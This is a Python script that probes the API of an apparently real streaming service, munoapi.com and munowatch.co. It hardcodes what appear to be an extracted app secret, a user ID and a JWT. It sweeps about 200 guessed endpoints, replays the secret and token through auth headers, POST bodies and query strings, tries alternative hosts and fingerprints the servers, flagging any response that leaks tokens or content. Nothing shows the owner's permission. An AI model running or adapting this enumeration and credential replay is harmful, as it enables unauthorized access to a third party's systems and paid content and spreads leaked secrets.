#!/usr/bin/env python3
"""Quick focused probe - minimal endpoints, 2s timeout, 0.01s sleep"""
import json,time,requests
from datetime import datetime

BASE="https://munoapi.com/api"
SEC="022778e418ad68ffda9aa4fab1892fff"
UID="82717"
UA="Android IOS v3.0"
TOK="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IkFuZHJvaWQgVFYiLCJhcHBuYW1lIjoiTXVub3dhdGNoIFRWIiwiaG9zdCI6Im11bm93YXRjaC5jbyIsImFwcHNlY3JldCI6IjAyMjc3OGU0MThhZDY4ZmZkYTlhYTRmYWIxODkyZmZmIiwiYWN0aXZhdGVkIjoiMSIsImV4cCI6MTcwNzM2ODQwMH0.unlPnEzptg6VFHs7WWm213bRHHNxYuAN2eZQvjtPKL0"

def bh(): return {"Accept":"application/json","User-Agent":UA}
def go(m,u,h=None,d=None):
    try:
        r=requests.request(m,u,headers=h or bh(),json=d,timeout=3,allow_redirects=False)
        bj=None
        try:bj=r.json()
        except:pass
        return r.status_code,bj,r.text[:300],{k:v for k,v in r.headers.items() if k.lower() in ("server","x-powered-by","content-type","allow","location","set-cookie")}
    except: return 0,None,"",{}

EPS=[
# Auth
"login","register","signup","signin","auth","authenticate",
"auth/login","auth/register","auth/signup","auth/signin",
"user/login","user/register","user/signup","user/auth",
"v1/login","v2/login","v1/auth","v2/auth",
"tv/login","tv/auth","android/auth",
# Token
"token","refresh","refresh-token","api-key","generate-key",
"auth/token","auth/refresh","token/generate","token/create","token/new","token/refresh","token/renew","token/issue",
"token/verify","token/validate","api/token","api/key","apikey","keys",
"generate/key","jwt","auth/jwt","session","oauth","oauth/token",
"client/token","credential","credentials","access-token",
# User
"user","users","profile","account","me","user/me","user/profile","user/info",
"account/me","whoami","myself","admin","admin/login","admin/dashboard",
# System
"dashboard-data","stats","config","settings","info","status","health","ping","version",
"dashboard","dashboard/info","api/info","api/status","api/version",
"app/info","app/config","about","docs","swagger","openapi","api-docs",
"graphql","help","changelog",
# Content
"categories","category","genre","genres","tags","popular","trending","latest","new","recent","top",
"browse","explore","discover","featured","recommended",
"movies","series","episodes","videos","video","media",
"shows","shows-all","all","home","list","lists","search","query",
"random","favorites","watchlist","history","continue",
# Media
"download","stream","play","embed","source","link","resolve",
"player","subtitle","thumbnail",
# Known
"search","browse","list","shows","preview",
"dashboard/v2/82717","preview/63003/82717","preview/v2/63003/82717",
"search/Avengers/82717/0","browse/tabs","list/5/0/82717/0","shows/5/0/82717/0",
# License
"key","license","activate","device","subscribe",
"key/activate","key/verify","license/activate",
"device/register","device/activate","device/auth",
"subscription","plan","plans","pricing","otp",
# Hidden
"","v1","v2","v3","v4","v5",
"public","open","free","guest","webhook","notification",
"payment","billing","cdn","test","dev","rest",
"munowatch","muno","tv","app","apps","client","developer",
"internal","private","secure",
]

QP_EPS=["dashboard","dashboard/82717","search","browse","list","shows","preview","preview/63003",
       "categories","popular","trending","latest","movies","user","profile","me","config","info"]

PAYLOADS=[
    {"appname":"Munowatch TV","appsecret":SEC,"host":"munowatch.co","username":"Android TV"},
    {"user_id":UID,"appsecret":SEC,"host":"munowatch.co"},
    {"api_key":SEC,"host":"munowatch.co"},
    {"key":SEC,"appname":"Munowatch TV"},
    {"secret":SEC,"host":"munowatch.co"},
]

AUTH_EPS=["login","auth","token","authenticate","apikey","activate","app/auth","device/register"]

results=[]
t0=time.time()

print(f"\n{'='*65}")
print(f" MUNOWATCH API PROBE — {len(EPS)} endpoints")
print(f"{'='*65}\n")

# Phase 1: GET sweep
print("[1] GET sweep (no auth)...")
for ep in EPS:
    url=f"{BASE}/{ep}" if ep else BASE
    s,bj,txt,rh=go("GET",url)
    results.append({"ep":ep,"url":url,"m":"GET","l":"no-auth","s":s,"b":bj,"t":txt,"h":rh,"d":None})
    if s not in (0,404):
        jstr=json.dumps(bj).lower() if bj else txt.lower()
        tok=any(w in jstr for w in ("token","api_key","jwt","eyj"))
        con=bj and isinstance(bj,dict) and any(k in bj for k in ("dashboard","banner","search","results","preview","data","movies","videos","shows","categories"))
        dat=bj and isinstance(bj,dict) and len(bj)>0 and "400" not in bj and "401" not in bj and "403" not in bj
        if s==200 and tok: print(f"  !! TOKEN  /{ep:<38} {json.dumps(bj)[:140]}")
        elif s==200 and con: print(f"  ++ DATA   /{ep:<38} keys:{list(bj.keys())[:6]}")
        elif s==200 and dat: print(f"  ** RESP   /{ep:<38} keys:{list(bj.keys())[:6]}")
        elif s==200: print(f"  200       /{ep:<38}")
        elif s in (401,403): print(f"  {s}       /{ep:<38} {json.dumps(bj)[:50] if bj else ''}")
        elif s==405: print(f"  405       /{ep:<38}")
        elif s>=500:
            exc=bj.get("exception",[]) if isinstance(bj,dict) else []
            if exc: print(f"  {s} LEAK  /{ep:<38} {json.dumps(exc[0])[:70]}")
            else: print(f"  {s}       /{ep:<38}")
        else: print(f"  {s}       /{ep:<38}")
    time.sleep(0.01)

# Phase 2: Auth header variations on live endpoints
live=list(dict.fromkeys(r["ep"] for r in results if r["s"] not in (0,404)))
print(f"\n[2] Auth headers on {len(live)} live endpoints...")

for aname,ah in [
    ("X-API-Key:s",{**bh(),"X-API-Key":SEC}),
    ("Bearer:s",{**bh(),"Authorization":f"Bearer {SEC}"}),
    ("X-App-S",{**bh(),"X-App-Secret":SEC}),
    ("JWT",{**bh(),"X-API-Key":TOK,"Authorization":f"Bearer {TOK}"}),
]:
    for ep in live:
        url=f"{BASE}/{ep}" if ep else BASE
        s,bj,txt,rh=go("GET",url,h=ah)
        results.append({"ep":ep,"url":url,"m":"GET","l":aname,"s":s,"b":bj,"t":txt,"h":rh,"d":None})
        if s==200 and bj and isinstance(bj,dict):
            jstr=json.dumps(bj).lower()
            if any(w in jstr for w in ("dashboard","banner","search","results","preview","data","movies","videos","shows","categories","token","api_key")):
                print(f"  HIT {aname:<12} /{ep:<35} {json.dumps(bj)[:140]}")
        time.sleep(0.01)

# Phase 3: POST payloads
print(f"\n[3] POST payloads on {len(AUTH_EPS)} auth endpoints x {len(PAYLOADS)} payloads...")
for ep in AUTH_EPS:
    for pl in PAYLOADS:
        pk=list(pl.keys())[0]
        url=f"{BASE}/{ep}"
        s,bj,txt,rh=go("POST",url,d=pl)
        results.append({"ep":ep,"url":url,"m":"POST","l":f"POST {pk}","s":s,"b":bj,"t":txt,"h":rh,"d":pl})
        if s in (200,201) and bj:
            jstr=json.dumps(bj).lower()
            if any(w in jstr for w in ("token","key","jwt","eyj","success","ok","created")):
                print(f"  HIT POST /{ep:<25} ({pk}) → {s}  {json.dumps(bj)[:140]}")
        time.sleep(0.01)

# Phase 4: Query params
print(f"\n[4] Query params on {len(QP_EPS)} endpoints...")
qp=[("?key=",SEC),("?api_key=",SEC),("?token=",SEC),("?secret=",SEC),("?appsecret=",SEC),("?apikey=",SEC)]
for ep in QP_EPS:
    for pn,pv in qp:
        url=f"{BASE}/{ep}{pn}{pv}"
        s,bj,txt,rh=go("GET",url)
        results.append({"ep":ep,"url":url,"m":"GET","l":f"QP {pn}","s":s,"b":bj,"t":txt,"h":rh,"d":None})
        if s==200 and bj and isinstance(bj,dict):
            if any(k in bj for k in ("dashboard","banner","search","results","preview","data","movies","videos","shows")):
                print(f"  HIT {pn:<14} /{ep:<30} {json.dumps(bj)[:120]}")
        time.sleep(0.01)

# Phase 5: Alt URLs
print(f"\n[5] Alternative URLs...")
ALTS=[
    "https://munoapi.com","https://munoapi.com/api/","https://munoapi.com/api/v1","https://munoapi.com/api/v2",
    "https://munoapi.com/api/v3","https://munowatch.co/api","https://munowatch.co/api/dashboard",
    "https://munowatch.co/api/v1","https://api.munowatch.co","https://api.munowatch.co/api",
    "https://hamcodz.duckdns.org/api","https://hamcodz.duckdns.org",
    f"{BASE}?key={SEC}",f"{BASE}?api_key={SEC}",f"{BASE}?secret={SEC}",f"{BASE}?appsecret={SEC}",
]
for url in ALTS:
    s,bj,txt,rh=go("GET",url)
    results.append({"ep":url,"url":url,"m":"GET","l":"alt","s":s,"b":bj,"t":txt,"h":rh,"d":None})
    if s not in (0,404):
        det=json.dumps(bj)[:80] if bj else txt[:60]
        if s in (301,302): det=f"→ {rh.get('location','?')}"
        print(f"  {s} {url:<55} {det[:50]}")
    time.sleep(0.01)

# Phase 6: OPTIONS on key endpoints
print(f"\n[6] OPTIONS/HEAD on key endpoints...")
for ep in ["","dashboard","search","login","token","auth","user","browse","preview","categories"]:
    url=f"{BASE}/{ep}" if ep else BASE
    s,bj,txt,rh=go("OPTIONS",url)
    results.append({"ep":ep,"url":url,"m":"OPTIONS","l":"OPTIONS","s":s,"b":bj,"t":txt,"h":rh,"d":None})
    allow=rh.get("allow","")
    if s in (200,204) and allow: print(f"  OPT /{ep:<38} Allow: {allow}")
    s,bj,txt,rh=go("HEAD",url)
    results.append({"ep":ep,"url":url,"m":"HEAD","l":"HEAD","s":s,"b":bj,"t":txt,"h":rh,"d":None})
    sv=rh.get("server",""); pw=rh.get("x-powered-by","")
    if sv or pw: print(f"  HEAD /{ep:<38} Server:{sv} Powered:{pw}")
    time.sleep(0.01)

# Phase 7: Known with JWT
print(f"\n[7] Known endpoints with JWT...")
jh={**bh(),"X-API-Key":TOK,"Authorization":f"Bearer {TOK}"}
for ep in ["dashboard","dashboard/v2/82717","search/Avengers/82717/0","preview/v2/63003/82717","browse/tabs","list/5/0/82717/0","shows/5/0/82717/0","categories","popular","latest"]:
    url=f"{BASE}/{ep}"
    s,bj,txt,rh=go("GET",url,h=jh)
    results.append({"ep":ep,"url":url,"m":"GET","l":"JWT","s":s,"b":bj,"t":txt,"h":rh,"d":None})
    if s==200: print(f"  OK  JWT /{ep:<40} keys:{list(bj.keys())[:6] if isinstance(bj,dict) else 'N/A'}")
    else: print(f"  {s}  JWT /{ep:<40} {json.dumps(bj)[:60] if bj else ''}")
    time.sleep(0.01)

# Save
elapsed=time.time()-t0
sd={}
for r in results:
    sc=str(r.get("s",0))
    sd[sc]=sd.get(sc,0)+1

useful=[]
for r in results:
    if r["s"]==200 and r["b"] and isinstance(r["b"],dict):
        jstr=json.dumps(r["b"]).lower()
        tok=any(w in jstr for w in ("token","api_key","jwt","eyj"))
        con=any(k in r["b"] for k in ("dashboard","banner","search","results","preview","data","movies","videos","shows","categories"))
        dat=len(r["b"])>0 and "400" not in r["b"] and "401" not in r["b"] and "403" not in r["b"]
        if tok or con or dat:
            useful.append(r)

servers=set();powereds=set()
for r in results:
    h=r.get("h",{})
    if h.get("server"):servers.add(h["server"])
    if h.get("x-powered-by"):powereds.add(h["x-powered-by"])

summary={
    "target":BASE,"elapsed":round(elapsed,1),"total":len(results),
    "status_dist":sd,"useful_200":len(useful),
    "server":list(servers),"powered_by":list(powereds),
    "interesting":[{"ep":r["ep"],"l":r["l"],"m":r["m"],"s":r["s"],
        "keys":list(r["b"].keys())[:10],"preview":json.dumps(r["b"])[:400]}
        for r in useful],
    "discovered":sorted(set(r["ep"] for r in results if r["s"] not in (0,404))),
}

OUT="/home/z/my-project/api_probe_results.json"
with open(OUT,"w") as f: json.dump({"summary":summary,"results":results},f,indent=2,default=str,ensure_ascii=False)

print(f"\n{'='*65}")
print(f" DONE: {elapsed:.1f}s | {len(results)} reqs | {len(useful)} useful | saved {OUT}")
print(f" Server: {list(servers)} | Powered: {list(powereds)}")
print(f"{'='*65}")
